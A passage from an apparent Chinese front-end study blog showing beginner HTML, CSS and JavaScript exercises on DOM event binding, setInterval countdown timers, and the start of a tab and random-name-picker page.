class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>day13 DOM事件模型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>:<span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="comment">/* height:200px; */</span></span></span><br><span class="line"><span class="css">            <span class="comment">/* 此处注释原因见js中的fn3部分 */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: blue;</span></span><br><span class="line"><span class="css">            <span class="attribute">transition</span>: <span class="number">0.5s</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">botton</span> <span class="attr">onclick</span>=<span class="string">&quot;fn()&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">botton</span> <span class="attr">onclick</span>=<span class="string">&quot;fn1()&quot;</span>&gt;</span>上拉<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">botton</span> <span class="attr">onclick</span>=<span class="string">&quot;fn2()&quot;</span>&gt;</span>下拉<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">botton</span> <span class="attr">onclick</span>=<span class="string">&quot;fn3()&quot;</span>&gt;</span>一个按钮实现上拉和下拉<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;height: 200px;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">botton</span>&gt;</span>开始倒计时<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>11<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>末日倒计时<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//DOM事件模型</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        //内联模型/事件属性模型 如<span class="tag">&lt;<span class="name">botton</span> <span class="attr">onclick</span>=<span class="string">“fn1()”</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//动态绑定/动态事件分配(如之前的对按钮分配绑定点击事件)btn.onclick=function ()() &#123;&#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//DOM允许js向html元素分配事件，先获取元素，后对元素分配事件</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//内联模型（css中类似的内联样式）</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&quot;在标签里面绑定事件的方式&quot;</span>)</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> odiv =<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;div&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            odiv.style.height=<span class="string">&quot;0px&quot;</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">fn2</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            odiv.style.height=<span class="string">&quot;200px&quot;</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">fn3</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(odiv.style.height);<span class="comment">//如果这里的height是在css的内联样式中定义的，那么此处获取的值为空白，因为odiv.style.height设置的样式默认是在标签的行内样式中设置的，所以默认是从标签行内样式中获取值的</span></span></span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(odiv.style.height==<span class="string">&quot;200px&quot;</span>)&#123;</span></span><br><span class="line">                fn1();</span><br><span class="line"><span class="javascript">                <span class="comment">// odiv.style.height=&quot;0px&quot;;</span></span></span><br><span class="line"><span class="javascript">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">                fn2();<span class="comment">//也可以通过函数调用的方式</span></span></span><br><span class="line"><span class="javascript">                <span class="comment">// odiv.style.height=&quot;200px&quot;;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//---------------------------------------------------------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//定时器setInterval(function()&#123;&#125;,时间(毫秒))</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//定时器属于BOM部分（js由ECMAScript，DOM和BOM构成）</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//清除定时器clearInterval</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// setInterval(function()&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     document.write(&quot;定时器&quot;+&quot;&lt;br&gt;&quot;)</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;, 1000);</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// var index=10;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var timer = setInterval(function()&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     index--;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     document.write(index+&quot;&lt;br&gt;&quot;)</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     if(index==0)&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//         clearInterval(timer);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//         alert(&quot;time is over&quot;)</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;, 300);</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//点击倒计时</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> btn=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;botton&quot;</span>)[<span class="number">4</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(btn);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> op=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;p&quot;</span>)[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript">        btn.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// alert(&quot;测试绑定成功&quot;);</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// var txt=op.innerHTML;//innerText同理</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// console.log(txt);</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// console.log(typeof(txt));//string</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// op.innerHTML=op.innerHTML-1;//隐式数据类型转换</span></span></span><br><span class="line"><span class="javascript">            timer=<span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//此处function是匿名函数</span></span></span><br><span class="line">                op.innerHTML--;</span><br><span class="line">                if(op.innerHTML==0)&#123;</span><br><span class="line"><span class="javascript">                    <span class="built_in">clearInterval</span>(timer);</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">            &#125;,<span class="number">500</span>)<span class="comment">//这样写有个bug，当点击多次按钮时会出现多个倒计时同时进行的情况</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//末日倒计时进阶版</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> endtime=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;p&quot;</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> time_begin = <span class="keyword">new</span> <span class="built_in">Date</span>();<span class="comment">//new Date获取系统当前时间</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> time_end = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&quot;2222/2/22 22:22&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> time_between = time_end - time_begin;<span class="comment">//默认毫秒</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> day = <span class="built_in">parseInt</span>(time_between / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> / <span class="number">24</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> hour = <span class="built_in">parseInt</span>(time_between / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> % <span class="number">24</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> min = <span class="built_in">parseInt</span>(time_between / <span class="number">1000</span> / <span class="number">60</span> % <span class="number">60</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> sec = <span class="built_in">parseInt</span>(time_between / <span class="number">1000</span> % <span class="number">60</span>);</span></span><br><span class="line"><span class="javascript">            endtime.innerHTML=<span class="string">&quot;距离世界末日还有&quot;</span> + day + <span class="string">&quot;天&quot;</span> + hour + <span class="string">&quot;小时&quot;</span> + min + <span class="string">&quot;分&quot;</span> + sec + <span class="string">&quot;秒&quot;</span>;</span></span><br><span class="line">        &#125;, 1000);</span><br><span class="line"></span><br><span class="line">         </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>参考资料</p><p>BOM和DOM详解：<a href="https://www.cnblogs.com/wangxiang9528/p/9855358.html">https://www.cnblogs.com/wangxiang9528/p/9855358.html</a></p><p>js三大对象详解：<a href="https://www.cnblogs.com/wjrelax/p/9091947.html">https://www.cnblogs.com/wjrelax/p/9091947.html</a></p><p>js三大对象：<a href="https://www.jianshu.com/p/f967154c78a7">https://www.jianshu.com/p/f967154c78a7</a></p><h2 id="day14-选项卡"><a href="#day14-选项卡" class="headerlink" title="day14 选项卡"></a>day14 选项卡</h2><h3 id="随机点名效果"><a href="#随机点名效果" class="headerlink" title="随机点名效果"></a>随机点名效果</h3><h3 id="选项卡效果"><a href="#选项卡效果" class="headerlink" title="选项卡效果"></a>选项卡效果</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>day14 随机姓名&amp;选项卡<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        botton&#123;</span><br><span class="line"><span class="css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">2px</span> <span class="number">2px</span> pink;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>:<span class="number">40px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>:<span class="number">72px</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>:<span class="number">500px</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">ul</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>:<span class="number">800px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-size</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">1px</span> <span class="number">0px</span> <span class="built_in">rgb</span>(<span class="number">13</span>, <span class="number">13</span>, <span class="number">14</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">float</span><span class="selector-pseudo">:left</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">URL</span>(<span class="string">./img/_10.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">            <span class="attribute">opacity</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *&#123;</span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">padding</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">list-style</span>: none;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">p</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>:<span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="css">            <span class="attribute">line-height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-size</span>:<span class="number">30px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">20px</span> auto;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">td</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>:<span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>:<span class="number">40px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">text-align</span>:center;</span></span><br><span class="line"><span class="css">            <span class="attribute">line-height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line">        &#125;</span><br><span class="line">        botton&#123;</span><br><span class="line"><span class="css">            <span class="attribute">width</span>:<span class="number">250px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>:<span class="number">50px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">20px</span> auto;</span></span><br><span class="line"><span class="css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="css">            <span class="attribute">line-height</span>: <span class="number">50px</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #li2&#123;</span><br><span class="line"><span class="css">            <span class="attribute">opacity</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>:<span class="number">10px</span> <span class="number">10px</span>; </span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>:<span class="number">70px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>:<span class="number">35px</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">        #div2&#123;</span><br><span class="line"><span class="css">            <span class="attribute">width</span>:<span class="number">250px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>:<span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">1px</span> <span class="number">1px</span> chartreuse;<span class="attribute">margin</span>:<span class="number">20px</span> auto;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: none;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">botton</span>&gt;</span>开始<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span 